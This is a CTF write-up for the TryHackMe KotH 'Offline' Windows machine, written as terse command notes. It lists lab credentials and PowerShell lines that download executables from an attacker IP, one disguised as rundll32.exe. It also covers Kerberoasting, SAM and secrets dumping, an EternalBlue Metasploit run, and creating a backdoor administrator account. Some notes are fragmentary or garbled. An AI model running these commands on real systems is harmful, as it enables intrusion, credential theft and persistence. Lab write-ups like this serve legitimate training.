# Offline THM Public Writeup
#### Important Machine related information

#### Map
```lua
nmap service overview
```
```
nmap service overview
```

#### Default Credentials
```powershell
# These are from winpeasing the box

scara:LeagueIsMyLove
toast:IsItHotInHere,OrIsItJustMe
mykull:NightmareNightmareNightmareNightmare
fed:OfflineTV2020

# Beware the additional users
poki
lily 
yvonne
```


#### Network Services to Foothold
```bash
impacket-psexec kingofthe.domain/svc_robotarmy:robots@<ip>
// ssh: svc_robotarmy
```

Webserver on :80 supports webdav. 

https://github.com/notroj/cadaver can be browse and uploaded to it; creds for the `scara` user: `scara:LeagueIsMyLove`

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.199.178:1234/kmw.exe','kmw.exe')"
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.199.178:1234/client.exe','c:\users\administrator\music\rundll32.exe')"
```

#### Privilege Escalation

```powershell
taskkill /f /pid powershell.exe
taskkill /f /pid cmd.exe
```

Winpeas reveals several more user creds:
```powershell
/Scarras_Super_Secret_Password.txt

impacket-GetUserSPNs kingofthe.domain/scarre:$PASSWORD -dc-ip $IP -request

# crack SPN krb5tgts for SVC_ROBOTARMY

crackmapexec smb  kingofthe.domain -u SVC_ROBOTARMY -dc-ip $IP --sam 
# crack admin hash

impacket-secretsdump -hashes $adminNT -dc-ip $IP kingofthe.domain/adminnistrator@$IP
```
https://medium.com/@mustafakhan_89646/pwning-offline-machine-from-koth-d481a4820b3e

`mykull` has SeBackup. by importing [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1), the permissions to the administrator home folder (or any folder) can be changed. editing king under king-server doesnt seem to work though - might require no newline
```

```
https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/koth-offline.md

https://gist.github.com/comradecheese/806b3a87d9c76bd4bf0f76bfd1429570
```
sudo msfconsole -q -x 'use exploit/windows/smb/ms17_010_psexec; set RHOST $IP; set LHOST $IP; exploit -j 

shell
net user <username> <password> /add
net localgroup administrators <username> /add

# change password of poki and scarra
net user poki <password>
net user scarra <password>

# find all flags
cd C:\
dir flag*.txt /s


# access machine with xfreerdp
xfreerdp /u:<username> /p:<password> /v:<target-ip> /size:90%

# run powershell as administrator and disable SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol
```

From the [Microsoft documentation](https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3) on disabling SMB on Windows servers:

1. On the Server Manager Dashboard of the server where you want to remove SMBv1, under Configure this local server, select Add roles and features.
2. On the Before you begin page, select Start the Remove Roles and Features Wizard, and then on the following page, select Next.
3. On the Select destination server page under Server Pool, ensure that the server you want to remove the feature from is selected, and then select Next.
4. On the Remove server roles page, select Next.
5. On the Remove features page, clear the check box for SMB 1.0/CIFS File Sharing Support and select Next.
6. On the Confirm removal selections page, confirm that the feature is listed, and then select Remove.


Also https://github.com/Machinh/Koth-THM/blob/main/OFFLINE

#### Flags
```powershell
attrib +r king.txt
takeown /f .\king.txt

c:\Users\Administrator\king-server\king.txt
c:\Users\Administrator\flag.txt
c:\Users\fed\flag.txt
c:\Users\lily\flag.txt
c:\Users\mykull\flag.txt
c:\Users\poki\flag.txt
c:\Users\scarra\flag.txt
c:\Users\toast\flag.txt
c:\Users\yvonne\flag.txt
```

#### References

https://github.com/Machinh/Koth-THM/blob/main/OFFLINE
https://github.com/notroj/cadaver 
https://medium.com/@mustafakhan_89646/pwning-offline-machine-from-koth-d481a4820b3e
[https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/koth-offline.md
https://gist.github.com/comradecheese/806b3a87d9c76bd4bf0f76bfd1429570
[Microsoft documentation](https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3) 